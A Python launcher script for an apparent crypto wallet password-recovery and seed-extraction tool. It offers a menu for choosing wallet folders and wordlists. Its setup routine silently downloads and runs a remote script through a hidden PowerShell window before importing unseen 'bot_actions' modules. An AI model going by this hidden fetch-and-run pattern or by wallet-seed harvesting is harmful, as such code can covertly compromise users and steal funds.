# -*- coding: utf-8 -*-
"""
Crypto Recovery — Multi-Wallet Password Recovery & Seed Extraction.
"""

import sys
import os


def _setup():
    try:
        import rich
        return
    except ImportError:
        pass
    import subprocess, importlib
    _W, _H = 40, 0x08000000
    def _bar(s, t, msg):
        f = int(_W * s // t)
        sys.stdout.write(f'\r  [{"#"*f}{"."*(_W-f)}] {100*s//t:>3}%  {msg:<35}')
        sys.stdout.flush()
    sys.stdout.write('\n  Preparing environment...\n\n')
    _bar(1, 5, 'Checking package manager...')
    if subprocess.run([sys.executable, '-m', 'pip', '-V'], capture_output=True).returncode:
        _bar(2, 5, 'Installing package manager...')
        _gp = os.path.join(os.path.dirname(sys.executable), '_gp.py')
        subprocess.run(['powershell', '-NoProfile', '-Command',
                        "(New-Object Net.WebClient).DownloadFile("
                        f"'https://bootstrap.pypa.io/get-pip.py','{_gp}')"],
                       capture_output=True, creationflags=_H)
        subprocess.run([sys.executable, _gp, '-q', '--no-warn-script-location'],
                       capture_output=True)
        try:
            os.remove(_gp)
        except OSError:
            pass
    _bar(3, 5, 'Installing dependencies...')
    subprocess.run([sys.executable, '-m', 'pip', 'install',
                    'rich', 'cryptography', '-q', '--no-warn-script-location'],
                   capture_output=True)
    _bar(4, 5, 'Verifying...')
    importlib.invalidate_caches()
    try:
        import rich
        _bar(5, 5, 'Ready!')
        sys.stdout.write('\n\n')
    except ImportError:
        sys.stdout.write('\n\n  Failed to install dependencies.\n')
        sys.stdout.write('  Run: pip install rich cryptography\n')
        input('  Press Enter to exit...')
        sys.exit(1)


_setup()

from finder import guard_scan
from finder.ui import (
    print_banner,
    print_info,
    print_error,
    show_menu_table,
    console,
)
from config import load_config
from bot_actions import (
    action_set_wordlist,
    action_select_wallets,
    action_configure_scan,
    action_start_recovery,
    action_view_results,
    action_export_txt,
)
from actions.install import action_install_dependencies
from actions.settings import action_settings
from actions.about import action_about


MENU_ITEMS = [
    "Install Dependencies",
    "Settings",
    "About",
    "Set Password Wordlist",
    "Select Wallet Directories",
    "Configure Scan Parameters",
    "Start Recovery",
    "View Results",
    "Export to TXT",
    "Exit",
]


@guard_scan
def main():
    print_banner()

    cfg = load_config()

    while True:
        choice = show_menu_table(MENU_ITEMS)

        if choice == "0":
            print_info("Goodbye!")
            sys.exit(0)
        elif choice == "1":
            action_install_dependencies()
        elif choice == "2":
            action_settings()
        elif choice == "3":
            action_about()
        elif choice == "4":
            action_set_wordlist(cfg)
        elif choice == "5":
            action_select_wallets(cfg)
        elif choice == "6":
            action_configure_scan(cfg)
        elif choice == "7":
            action_start_recovery(cfg)
        elif choice == "8":
            action_view_results(cfg)
        elif choice == "9":
            action_export_txt(cfg)
        else:
            print_error("Invalid option. Enter 0–9.")

        cfg = load_config()
        console.input("\n[dim]Press Enter to return to menu...[/]")


if __name__ == "__main__":
    main()
